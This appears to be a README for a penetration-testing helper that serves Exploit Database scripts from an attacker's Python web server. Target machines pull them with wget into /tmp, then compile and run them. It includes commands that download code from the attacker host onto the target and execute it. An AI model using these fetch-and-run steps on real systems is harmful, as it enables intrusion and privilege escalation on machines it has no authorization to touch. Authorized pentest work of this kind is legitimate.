# Exploit Database Upload
The purpose of this is to make the process of uploading exploit database scripts to a target machine. The local script will make 
the webserver and the upload files will curl and compile/run the files. I created this because I have been annoyed by the boring 
process of uploading, compiling, running, and crying as each script fails (jk). This speeds up the process.
It also allows other scripts to be uploaded and ran, so it isn't limited to exploit database exploits.

## Prerequisites
This is built to work in a pentest of most unix devices. The host system I use is kali linux, but any machine with SimpleHTTPServer 
(python) installed should work. The upload file pulls from a server running this way, so modification will have to happen (port) to 
get it working its best.
In addition, the 'upload' file used wget, so this needs to be on the remote system (curl can be used instead)

## Instructions

**Local**

Run the local file
```
bash local.sh
```
**Remote**

Upload the 'upload' file to /tmp. I'll give the example of using a webserver
```
wget ip:port/file > /tmp/upload.py
```
Example
```
wget 192.168.1.6:8000/upload.py > /tmp/upload.py
```
The upload.py file will already be hosted on the server to start with, so this method should be simple.
The rest of the program should be fairly simple to use after running
```
cd /tmp
python3 upload.py
```
The program may work in python 2, but the functionality is not as good as I would like it to be. Please use python 3.
